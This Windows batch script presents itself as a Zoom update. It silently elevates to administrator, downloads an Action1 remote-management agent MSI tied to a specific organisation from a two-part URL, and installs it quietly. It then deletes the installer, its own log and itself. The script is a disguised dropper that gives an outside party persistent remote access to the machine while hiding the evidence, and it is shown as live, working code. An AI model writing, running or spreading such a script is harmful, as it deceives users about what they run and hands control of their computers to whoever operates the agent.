@echo off
setlocal EnableExtensions

:: Log file
set "LOG=%TEMP%\zoom_install.log"
echo %DATE% %TIME% - Starting Zoom update > "%LOG%"

:: Elevate to admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo %DATE% %TIME% - Not admin, elevating... >> "%LOG%"
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
echo %DATE% %TIME% - Admin privileges confirmed >> "%LOG%"

:: Build download URL from two parts (UPDATED URL)
set "A=https://app.na-2.action1.com/agent/cf9dcd34-a15a-11f1-8581-7b6187962899/Windows/"
set "B=agent(My_Organization).msi"
set "URL=%A%%B%"
set "MSI=%TEMP%\pkg.msi"
echo %DATE% %TIME% - Download URL: %URL% >> "%LOG%"

:: If already installed, skip and clean up
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "Action1" >nul 2>&1
if %errorlevel%==0 (
    echo %DATE% %TIME% - Action1 already installed, skipping >> "%LOG%"
    goto :cleanup
)

:: Download using curl (primary)
echo %DATE% %TIME% - Attempting download with curl... >> "%LOG%"
set "RETRIES=3"
set "COUNT=0"
:download_curl
set /a COUNT+=1
curl -o "%MSI%" "%URL%" --silent --fail --connect-timeout 10
if %errorlevel% equ 0 if exist "%MSI%" if %~z0 gtr 0 goto :installing
if %COUNT% LSS %RETRIES% (
    echo %DATE% %TIME% - curl attempt %COUNT% failed, retrying... >> "%LOG%"
    timeout /t 2 >nul
    goto :download_curl
)
echo %DATE% %TIME% - curl failed after %COUNT% attempts >> "%LOG%"

:: Fallback to PowerShell
echo %DATE% %TIME% - Trying PowerShell download... >> "%LOG%"
set "COUNT=0"
:download_ps
set /a COUNT+=1
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%URL%' -OutFile '%MSI%' -ErrorAction Stop } catch { exit 1 }"
if %errorlevel% equ 0 if exist "%MSI%" if %~z0 gtr 0 goto :installing
if %COUNT% LSS %RETRIES% (
    echo %DATE% %TIME% - PowerShell attempt %COUNT% failed, retrying... >> "%LOG%"
    timeout /t 2 >nul
    goto :download_ps
)
echo %DATE% %TIME% - PowerShell failed after %COUNT% attempts >> "%LOG%"
echo %DATE% %TIME% - Download failed. Exiting. >> "%LOG%"
goto :cleanup

:installing
echo %DATE% %TIME% - Download successful (size: %~z0 bytes) >> "%LOG%"
echo %DATE% %TIME% - Installing MSI... >> "%LOG%"
msiexec /i "%MSI%" /quiet /qn
echo %DATE% %TIME% - msiexec exit code: %errorlevel% >> "%LOG%"

:: Optionally verify installation by checking registry again
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "Action1" >nul 2>&1
if %errorlevel% equ 0 (
    echo %DATE% %TIME% - Action1 appears to be installed successfully >> "%LOG%"
) else (
    echo %DATE% %TIME% - Action1 not found after install >> "%LOG%"
)

:cleanup
if exist "%MSI%" (
    echo %DATE% %TIME% - Cleaning up MSI >> "%LOG%"
    del /f /q "%MSI%" >nul 2>&1
)

:: Self-delete
echo %DATE% %TIME% - Self-deleting batch file >> "%LOG%"
powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath '%~f0' -Force; Remove-Item -LiteralPath '%LOG%' -Force"

exit /b